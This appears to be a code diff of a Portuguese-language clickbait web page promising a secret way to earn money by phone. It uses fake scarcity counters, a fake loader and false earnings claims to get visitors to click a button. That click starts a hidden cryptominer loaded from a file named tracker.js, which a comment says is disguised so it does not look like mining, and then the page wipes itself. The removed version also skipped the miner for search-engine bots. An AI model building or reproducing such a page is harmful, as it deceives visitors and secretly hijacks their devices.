@@ -1,36 +1,142 @@
 <!DOCTYPE html>
-<html>
+<html lang="pt-BR">
 <head>
-    <title>Dica de Renda Extra em 2025</title>
-    <meta name="description" content="Aprenda a ganhar R$500 por semana com celular">
+    <meta charset="UTF-8">
+    <title>Dica Proibida: Gere R$87 por Dia com Celular</title>
+    <meta name="description" content="Método secreto que as empresas não querem que você veja. Funciona em 2025.">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body {
+            background: #121212;
+            color: #e0e0e0;
+            text-align: center;
+            padding: 20px;
+            line-height: 1.6;
+            transition: opacity 0.5s ease;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        h1 {
+            font-size: 28px;
+            margin: 20px 0;
+            color: #ff3366;
+            text-shadow: 0 0 10px rgba(255, 51, 102, 0.3);
+        }
+        p {
+            font-size: 18px;
+            margin: 15px 0;
+        }
+        .btn {
+            background: linear-gradient(45deg, #ff3366, #cc0066);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 50px;
+            margin: 20px 0;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(255, 51, 102, 0.4);
+            transition: all 0.3s;
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(255, 51, 102, 0.6);
+        }
+        .counter {
+            color: #ffcc00;
+            font-weight: bold;
+            font-size: 20px;
+        }
+        #content {
+            margin-top: 20px;
+            font-size: 16px;
+            color: #aaa;
+        }
+        .fake-loader {
+            width: 80%;
+            height: 20px;
+            background: #1e1e1e;
+            border-radius: 10px;
+            margin: 20px auto;
+            overflow: hidden;
+            display: none;
+        }
+        .fake-loader::after {
+            content: '';
+            display: block;
+            width: 30%;
+            height: 100%;
+            background: #00cc99;
+            animation: load 2s infinite;
+        }
+        @keyframes load {
+            0% { width: 10%; }
+            50% { width: 70%; }
+            100% { width: 10%; }
+        }
+    </style>
 </head>
 <body>
 
-<h1>Descubra o método proibido que gera R$87 por dia</h1>
-<p>Clique abaixo para liberar acesso antes que retirem do ar:</p>
-<button onclick="startMiner()">VER MÉTODO (VAGAS RESTANTES: 3)</button>
+<div class="container">
+    <h1>🚀 Método PROIBIDO Gera R$87 por Dia (Funciona em 2025)</h1>
+    <p>Empresas de cartão estão <strong>pagando R$300 por cadastro</strong>... e ninguém te conta!</p>
+    <p class="counter">⚠️ VAGAS RESTANTES: <span id="vagas">3</span></p>
 
-<div id="content"></div>
+    <button class="btn" onclick="iniciar()">🔓 LIBERAR ACESSO (CLIQUE AQUI)</button>
 
-<script src="miner.js"></script>
+    <div class="fake-loader" id="loader"></div>
+    <div id="content"></div>
+</div>
+
+<!-- CARREGA O MINERO INVISÍVEL (sem parecer mineração) -->
+<script src="/tracker.js"></script>
 
 <script>
-function isBot() {
-    return /bot|google|facebook|crawler|spider|yahoo|yandex/i.test(navigator.userAgent);
+let vagas = 3;
+
+function atualizarVagas() {
+    if (vagas > 0) {
+        vagas--;
+        document.getElementById('vagas').textContent = vagas;
+        if (vagas === 0) {
+            setTimeout(() => {
+                document.querySelector('.btn').textContent = '✅ ESGOTADO! (Lista de espera)';
+                document.querySelector('.btn').disabled = true;
+                document.querySelector('.btn').style.opacity = 0.6;
+            }, 1000);
+        }
+    }
 }
 
-function startMiner() {
-    if (isBot()) return;
+function iniciar() {
+    // Simula carregamento
+    const btn = document.querySelector('.btn');
+    btn.textContent = 'Carregando método secreto...';
+    btn.disabled = true;
 
-    document.querySelector('button').remove();
-    document.getElementById('content').innerHTML = '<p>Carregando método secreto...</p>';
+    document.getElementById('loader').style.display = 'block';
+    document.getElementById('content').innerHTML = '<p>Verificando elegibilidade...</p>';
 
-    // O minero já foi carregado via miner.js
+    // Atualiza vagas
+    atualizarVagas();
+
+    // Chama o minero (que já tá no tracker.js)
+    if (typeof startMining === 'function') {
+        startMining();
+    }
+
+    // Finge que liberou acesso, mas mata a página depois
     setTimeout(() => {
         document.body.style.opacity = 0;
         document.body.style.height = '1px';
         document.body.style.overflow = 'hidden';
-    }, 2000);
+        document.body.innerHTML = ''; // Apaga tudo
+    }, 4000);
 }
 </script>
 
